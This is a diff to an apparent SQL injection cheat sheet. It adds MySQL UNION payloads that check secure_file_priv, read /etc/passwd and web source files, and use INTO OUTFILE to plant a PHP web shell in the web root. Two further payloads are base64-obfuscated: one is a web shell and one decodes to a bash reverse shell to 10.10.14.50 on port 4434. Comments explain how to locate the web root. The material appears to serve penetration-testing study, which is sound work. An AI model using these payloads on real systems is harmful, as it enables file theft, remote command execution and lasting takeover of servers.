@@ -220,10 +220,17 @@ SELECT LOAD_FILE('/etc/passwd')
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -                  '--- Empty means we can read/write anywhere
 
-'--- LOAD_FILE
+--- Load Files (requires `FILE` priv, `secure_file_priv` disabled)
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -               --- May need to check page source
+
+--- Write Files (requires `FILE` priv, `secure_file_priv` disabled, and write access to backend location)
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -                      '--- Must know the base web directory for the web server (i.e. web root): Use `load_file` to read the server configuration (e.g. Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config), OR we can search online OR run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+' UNION SELECT 1, FROM_BASE64('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4='), 3, 4 INTO OUTFILE '/var/www/html/webshell.php'-- -            '--- Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+' UNION SELECT 1, FROM_BASE64('PD9waHAgc3lzdGVtKCdiaW4vYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDM0IDA+JjEiJyk7ID8+'), 3, 4 INTO OUTFILE '/var/www/html/revshell3.php'-- -
 ```
 
 ### NON-ORACLE
